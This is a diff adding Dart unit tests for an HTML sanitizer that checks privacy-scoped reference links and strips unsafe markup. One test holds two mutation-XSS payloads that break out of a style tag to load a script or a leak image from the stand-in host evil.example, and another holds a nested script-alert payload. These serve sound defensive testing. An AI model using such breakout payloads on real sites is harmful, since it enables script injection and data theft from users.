@@ -538,5 +538,89 @@ void main() {
       expect(a.html, b.html);
       expect(a.diagnostics, b.diagnostics);
     });
+
+    test('blocks <style> breakout mXSS in Surface 2 HTML documents', () {
+      const payloads = <String>[
+        '<style>.a { font-family: </*x*/style><script src="https://evil.example/a.js"></script>; }</style><p>ok</p>',
+        '<style>.a { font-family: </<!-- -->style><img src="https://evil.example/leak">; }</style><p>ok</p>',
+      ];
+      for (final payload in payloads) {
+        final res = sanitizeBlinkHtml(
+          payload,
+          options: const SanitizeOptions(
+            profile: SanitizeProfile.surface2Sandbox,
+          ),
+        );
+        expect(res.isValid, isFalse);
+        expect(res.html, '<p>ok</p>');
+        expect(res.html.toLowerCase(), isNot(contains('<script')));
+        expect(res.html.toLowerCase(), isNot(contains('evil.example')));
+      }
+    });
+
+    test('enforces refValidator and privacy scope on direct <a href="blink-ref://..."> links in Surface 2', () {
+      const html =
+          '''
+          <p>
+            <a class="blink-ref" href="blink-ref://entry/$_validUuid1">Valid</a>
+            <a class="blink-ref" href="blink-ref://entry/$_validUuid2">Secret</a>
+            <a class="blink-ref" href="blink-ref://annotation/019349c8-7c10-7b22-a111-4058c2e90999">Missing</a>
+            <a class="blink-ref" href="blink-ref://source/$_validUuid1?anchor=bad%20anchor">BadAnchor</a>
+          </p>
+        ''';
+
+      final res = sanitizeBlinkHtml(
+        html,
+        options: SanitizeOptions(
+          profile: SanitizeProfile.surface2Sandbox,
+          producer: HtmlProducer.aiDerived,
+          privacyScope: PrivacyScope.normalOnly,
+          refValidator: (target, scope) {
+            if (target.id == _validUuid1) {
+              return BlinkRefValidationStatus.valid;
+            }
+            if (target.id == _validUuid2) {
+              return BlinkRefValidationStatus.privacyScopeViolation;
+            }
+            return BlinkRefValidationStatus.notFound;
+          },
+        ),
+      );
+
+      expect(res.isValid, isFalse);
+      expect(res.extractedRefs, hasLength(1));
+      expect(res.extractedRefs.single.id, _validUuid1);
+      expect(
+        res.html,
+        contains(
+          '<a class="blink-ref" href="blink-ref://entry/$_validUuid1">Valid</a>',
+        ),
+      );
+      expect(res.html, contains('[private-ref]'));
+      expect(res.html, isNot(contains('Secret')));
+      expect(res.html, isNot(contains(_validUuid2)));
+      expect(res.html, isNot(contains('Missing')));
+      expect(res.html, isNot(contains('BadAnchor')));
+      expect(
+        res.diagnostics.map((d) => d.code),
+        containsAll(<DiagnosticCode>[
+          DiagnosticCode.privacyScopeViolation,
+          DiagnosticCode.brokenBlinkRef,
+          DiagnosticCode.invalidBlinkAttr,
+        ]),
+      );
+    });
+
+    test('recursively drops nested script text inside <blink-ref> child tags', () {
+      const html =
+          '<blink-ref kind="entry" id="$_validUuid1"><b><script>alert(1)</script>Label</b></blink-ref>';
+      final res = sanitizeBlinkHtml(
+        html,
+        options: const SanitizeOptions(profile: SanitizeProfile.surface1Native),
+      );
+      expect(res.isValid, isFalse);
+      expect(res.html, isNot(contains('alert(1)')));
+      expect(res.html, contains('>Label</blink-ref>'));
+    });
   });
 }
